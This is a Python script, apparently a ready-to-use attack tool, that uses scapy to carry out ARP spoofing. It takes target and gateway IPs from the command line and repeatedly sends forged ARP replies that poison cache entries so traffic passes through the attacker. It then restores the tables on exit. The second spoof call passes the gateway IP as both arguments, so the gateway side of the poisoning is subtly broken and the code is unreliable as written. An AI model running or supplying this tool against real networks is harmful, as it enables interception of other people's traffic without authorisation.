#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys
import argparse


try:
    file1 = open('arp-spoofer-header.txt', 'r')
    print(' ')
    print (file1.read())
    file1.close()
except IOError:
    print('\nBanner File not found!')


# get ip address of target and gateway
def get_ip():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Use -t flag to specify Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Use -g flag to specify Gateway IP")
    options = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify Target IP. Use --help for instructions.")
    elif not options.gateway_ip:
        parser.error("[-] Please specify Gateway IP. Use --help for instructions.")

    return options


# get mac address of target and gateway
def get_mac(ip):
    arp_header = scapy.ARP(pdst=ip)
    ether_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # create arp request packet
    arp_request_packet = ether_header / arp_header
    answer_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0]

    # retrieve mac address from response
    return answer_list[0][1].hwsrc


# perform arp spoofing
def spoof(target_ip, spoof_ip) :
    target_mac = get_mac(target_ip)

    # create arp response packet
    arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response_packet, verbose=False)


# restoring arp table after poisoning
def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    arp_response_packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(arp_response_packet, count=4, verbose=False)


options = get_ip()

try:
    sent_packet_count = 0
    
    print("\n[+] ARP Spoofer is active. Your Gateway IP Address has been Spoofed.")
    print("\n[-] Press Ctrl+C to Restore ARP Tables and Exit.\n")

    # keep track of transmitted no. of packets
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.gateway_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r - Packets sent : " + str(sent_packet_count))
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    # restore arp table
    print("\n\n[-] Restoring ARP Tables....Please Wait\n")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)






















